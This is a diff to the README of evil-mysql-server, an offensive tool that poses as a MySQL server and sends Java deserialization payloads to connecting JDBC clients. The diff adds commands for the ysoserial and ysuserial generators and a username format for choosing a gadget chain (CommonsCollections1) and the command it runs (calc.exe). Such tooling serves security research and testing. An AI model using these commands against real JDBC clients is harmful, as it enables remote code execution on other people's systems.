@@ -8,6 +8,8 @@ English | [简体中文](./README-zh_CN.md)
 
 Usage
 
+[ysoserial](https://github.com/frohoff/ysoserial)
+
 ```shell
 ./evil-mysql-server -addr 3306 -java java -ysoserial ysoserial-0.0.6-SNAPSHOT-all.jar
 ```
@@ -15,7 +17,19 @@ Usage
 After successful startup use jdbc to connect, where the username format is `yso_payload_command`, after successful connection **evil-mysql-server** will parse the username and generate malicious data back to the jdbc client using the following command.
 
 ```shell
-java -jar ysoserial.jar CommonsCollections1 calc.exe
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 calc.exe
+```
+
+[ysuserial](https://github.com/su18/ysoserial) It's an enhanced project based on original ysoserial.
+
+```shell
+./evil-mysql-server -addr 3306 -java java -ysuserial ysuserial-0.9-su18-all.jar
+```
+
+After successful startup use jdbc to connect, where the username format is `ysu_payload_command`, after successful connection **evil-mysql-server** will parse the username and generate malicious data back to the jdbc client using the following command.
+
+```shell
+java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p calc.exe
 ```
 
 ## JDBC url examples
